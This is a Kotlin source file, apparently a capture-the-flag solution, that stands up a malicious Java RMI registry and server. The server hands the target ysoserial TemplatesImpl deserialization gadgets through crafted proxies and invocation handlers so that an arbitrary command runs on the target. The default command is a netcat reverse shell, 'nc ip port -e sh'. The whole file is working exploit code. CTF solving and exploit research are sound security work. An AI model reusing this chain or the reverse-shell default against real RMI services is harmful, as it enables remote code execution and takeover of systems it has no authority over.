package soln

import com.ctf.threermi.*
import org.joor.Reflect
import ysoserial.payloads.util.Gadgets
import java.beans.PropertyChangeEvent
import java.beans.PropertyVetoException
import java.lang.reflect.Proxy
import java.rmi.Remote
import java.rmi.registry.LocateRegistry
import java.rmi.registry.Registry
import java.rmi.server.UnicastRemoteObject
import javax.xml.transform.Templates

fun main(args: Array<String>) {
    require(args.size == 2 || args.size == 3)
    val cmd = args[0]
    val evilRegistryPort = args[1].toInt()
    val evilServerPort = args.getOrElse(2) { "14884" }.toInt()
    LocateRegistry.createRegistry(evilRegistryPort)
    val registry = LocateRegistry.getRegistry(evilRegistryPort)
    val userImpl = UserImpl(registry).also(refs::add)
    registry.bind("user", UnicastRemoteObject.exportObject(userImpl, evilServerPort))
    val factoryImpl = FactoryImpl(cmd).also(refs::add)
    registry.bind("factory", UnicastRemoteObject.exportObject(factoryImpl, evilServerPort))
}

private val refs = ArrayList<Any>() // To keep strong references.

private class UserImpl(
    private val registry: Registry
) : UserInter {
    override fun sayHello(var1: String?): String {
        val gadget = Reflect.onClass(Gadget::class.java)
            .create()
            .set("user", this)
            .set("mName", "newTransformer")
            .get<Gadget>()
        val event = PropertyChangeEvent("0", "0", "0", gadget)
        throw PropertyVetoException("0", event)
    }

    override fun getGirlFriend(): Friend {
        val classLoader = Thread.currentThread().contextClassLoader
        val factory = Proxy.newProxyInstance(
            classLoader,
            arrayOf(Remote::class.java, FactoryInter::class.java),
            Proxy.getInvocationHandler(registry.lookup("factory"))
        )
        val handler = Reflect.onClass(MyInvocationHandler::class.java)
            .create()
            .set("object", factory)
            .get<MyInvocationHandler>()
        val interfaces = arrayOf(Friend::class.java, Templates::class.java)
        val proxy = Proxy.newProxyInstance(classLoader, interfaces, handler)
        return proxy as Friend
    }
}

private class FactoryImpl(
    private val cmd: String = "sh -c \$@|sh 0 echo nc ip port -e sh"
) : FactoryInter {
    override fun getObject(): Any {
        return Gadgets.createTemplatesImpl(cmd)
    }
}
